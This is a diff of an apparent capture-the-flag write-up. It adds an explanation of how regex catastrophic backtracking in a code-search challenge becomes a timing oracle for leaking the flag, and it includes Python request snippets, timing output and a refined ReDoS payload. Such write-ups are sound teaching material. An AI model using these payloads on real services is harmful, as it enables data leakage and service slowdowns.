@@ -1,6 +1,7 @@
 This challenge allows us to search for words or expressions from a list of files containing programs written in different programming langauages.
 
-![image](https://github.com/user-attachments/assets/9721e3de-a5a3-489b-911e-0cbf942ec3c6)
+![image](https://github.com/user-attachments/assets/bc95cbf1-776b-4cb2-8bc8-5b9d74457971)
+
 
 On viewing the code_samples folder within the source code, we can see that there is a file `flag.txt`.
 
@@ -46,6 +47,23 @@ payload -
 As observed, it shows *catastrophic backtracking* when the guess is incorrect and it loads quickly otherwise.
 
 Hence, a python script is written based on this, such that we guess the next character using the delays. The python script assists to change the characters and check the delay.
+
+However, while testing the query, we can observe - 
+```
+>>> r = requests.post(url, json={"query":"/^a|^(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)~$/","language":"All"})
+>>> r.elapsed
+datetime.timedelta(seconds=1, microseconds=11727)
+>>> r = requests.post(url, json={"query":"/^u|^(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)~$/","language":"All"})
+>>> r.elapsed
+datetime.timedelta(seconds=1, microseconds=12811)
+
+```
+that the time required is almost the same whether the guess is correct or wrong.
+This is because there are many files other than flag.txt which can match regex for the second part while not matching for the first so there will be the same delay regardless of our guess being right.
+
+Hence we need to modify our payload to - 
+` ^uoftctf{guess}|^uoft(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)~$ `
+since ``uoft`` would not get any match out of the flag.txt file so the catastrophic backtracking won't happen unless the search is done within the flag.txt file.
 
 
 
